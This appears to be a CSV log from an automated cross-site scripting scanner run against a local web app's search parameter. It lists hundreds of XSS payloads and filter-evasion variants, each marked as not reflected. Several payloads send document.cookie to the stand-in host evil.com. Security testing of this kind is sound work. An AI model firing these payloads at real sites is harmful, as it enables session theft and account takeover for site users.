+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=javascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<a href=""javascript:alert(1)"">X</a>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href='javascript:alert(1)'>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<base href=javascript:alert(1)//>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animate onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><set onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animatetransform onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><discard onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img name=alert src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.cookie)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpopstate=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpageshow=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onpagehide=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body/onstorage=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script><![CDATA[alert(1)]]></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<source src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<track src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<use href=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input autofocus onfocus=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select autofocus onfocus=alert(1)></select>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerdown=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerup=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerover=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerenter=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointerleave=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onpointermove=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchstart=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchend=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div ontouchmove=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div data-x=x onclick=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input accesskey=x onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img/src=""x""/onerror=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img%20src=x%20onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img	src=x	onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script	>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,src=//evil.com></script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=confirm(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=print()>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=prompt(1)>X</marquee>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=confirm(1)>X</marquee>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/src=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe%20src=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<object/data=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<embed/src=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<var onmouseover=alert(1)>X</var>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<code onmouseover=alert(1)>X</code>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<span onmouseover=alert(1)>X</span>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<p onmouseover=alert(1)>X</p>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<h1 onmouseover=alert(1)>X</h1>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<h2 onmouseover=alert(1)>X</h2>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<pre onmouseover=alert(1)>X</pre>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<li onmouseover=alert(1)>X</li>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dt onmouseover=alert(1)>X</dt>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dd onmouseover=alert(1)>X</dd>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<legend onmouseover=alert(1)>X</legend>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<label onmouseover=alert(1)>X</label>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><col onmouseover=alert(1)></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<meter onmouseover=alert(1)>X</meter>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<progress onmouseover=alert(1)>X</progress>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<output onmouseover=alert(1)>X</output>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<time onmouseover=alert(1)>X</time>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<mark onmouseover=alert(1)>X</mark>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<wbr onmouseover=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ins onmouseover=alert(1)>X</ins>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<del onmouseover=alert(1)>X</del>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<small onmouseover=alert(1)>X</small>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<em onmouseover=alert(1)>X</em>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<b onmouseover=alert(1)>X</b>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<i onmouseover=alert(1)>X</i>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<u onmouseover=alert(1)>X</u>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<s onmouseover=alert(1)>X</s>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sub onmouseover=alert(1)>X</sub>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sup onmouseover=alert(1)>X</sup>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<address onmouseover=alert(1)>X</address>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<article onmouseover=alert(1)>X</article>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<aside onmouseover=alert(1)>X</aside>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<footer onmouseover=alert(1)>X</footer>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<header onmouseover=alert(1)>X</header>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<nav onmouseover=alert(1)>X</nav>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<main onmouseover=alert(1)>X</main>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<figure onmouseover=alert(1)>X</figure>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<menu onmouseover=alert(1)>X</menu>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""><script>alert(1)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,'><script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""></script><script>alert(1)</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,';alert(1);//,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,""";alert(1);//",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,""" onmouseover=alert(1) x=""",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"""onmouseover=""alert(1)",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,' onmouseover=alert(1) x=',NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,""" autofocus onfocus=alert(1) x=""",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,' autofocus onfocus=alert(1) x=',NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script><svg onload=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,--><script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,--!><script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oncut=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onclick=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrag=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onerror=prompt(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=#x onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a name=x onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><marquee onstart=confirm(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><marquee onstart=prompt(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oneonerrorrror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<button formaction=javascript:alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form action=javascript:alert(1)><button>X</button></form>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video poster=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<html manifest=javascript:alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img lowsrc=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img dynsrc=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=vbscript:msgbox(1)>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=about:blank>X</a>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<input placeholder=""test"" onmouseover=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div title=""test"" onmouseover=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img alt=""test"" src=x onerror=alert(1)>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<blockquote cite=javascript:alert(1)>X</blockquote>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img longdesc=javascript:alert(1) src=x>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img ismap src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input dirname=test onchange=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#40;1&#41;</script></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#x28;1&#x29;</script></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>&#97;lert(1)</script></svg>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""xss:expression(alert(1))"">X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<div style=""background:expression(alert(1))"">X</div>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<isindex type=submit value=X onclick=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<bgsound src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<applet code=x onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>al\u0065rt(1)</script>,NO_REFLECTION,No,,Info
+2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>al\x65rt(1)</script>,NO_REFLECTION,No,,Info
